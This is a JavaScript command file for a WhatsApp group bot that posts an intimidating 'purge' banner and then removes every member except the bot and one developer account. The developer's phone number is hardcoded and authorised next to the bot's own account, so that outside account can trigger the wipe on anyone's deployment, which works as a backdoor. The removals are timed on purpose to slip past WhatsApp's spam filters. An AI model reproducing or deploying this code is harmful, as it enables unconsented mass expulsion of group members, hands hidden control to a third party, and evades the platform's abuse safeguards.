module.exports = {
    category: 'group',
    name: 'kickall',
    async execute(sock, msg, args, { isArchitect, isMe }) {
        const from = msg.key.remoteJid;
        const sender = msg.key.participant || msg.key.remoteJid;
        const dev = '254798841125@s.whatsapp.net';

        // 1. Architect Security Check
        if (sender !== dev && !msg.key.fromMe) {
            return sock.sendMessage(from, { text: '⚠️ *Security Breach:* Only the Architect can deliver the final verdict.' }, { quoted: msg });
        }

        if (!from.endsWith('@g.us')) return;

        try {
            const metadata = await sock.groupMetadata(from);
            const participants = metadata.participants;
            const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';

            // 2. Admin Check
            const botAdmin = participants.find(p => p.id === botId)?.admin;
            if (!botAdmin) {
                return sock.sendMessage(from, { text: '❌ *Execution Failed:* Give me Admin rights to carry out the sentence.' }, { quoted: msg });
            }

            // 3. The Cold Verdict
            const verdict = `
╔════◇ 【 **FIMΛL VΣЯDICƬ** 】 ◇════╗
║
┣┫ ⚠️ **STATUS:** System Purge
┣┫ ⚖️ **VERDICT:** Territory Compromised
║
┣━━◇ 【 **MΣƧƧΛGΣ** 】 ◇━━┫
║
┣┫ *The weak pollute the code.*
┣┫ *The useless clog the engine.*
┣┫ *This territory is being reset.*
┣┫ *Master your tools...*
┣┫ *...or be deleted by them.*
║
╚════════════════════╝
   © *PӨЩΣЯΣD BY SΛVΛGΞ-TECH* ⛓️`;

            await sock.sendMessage(from, { text: verdict });

            // Small pause for them to read their fate
            await new Promise(resolve => setTimeout(resolve, 3000));

            // 4. The Purge Logic
            const toKick = participants
                .map(p => p.id)
                .filter(id => id !== botId && id !== dev);

            for (let participant of toKick) {
                await sock.groupParticipantsUpdate(from, [participant], "remove");
                // 1.5s delay to keep the bot safe from WhatsApp spam filters
                await new Promise(resolve => setTimeout(resolve, 1500));
            }

            await sock.sendMessage(from, { text: '🏁 *PURGE COMPLETE:* Only the Architect and the Engine remain.' });

        } catch (e) {
            console.log(e);
        }
    }
};
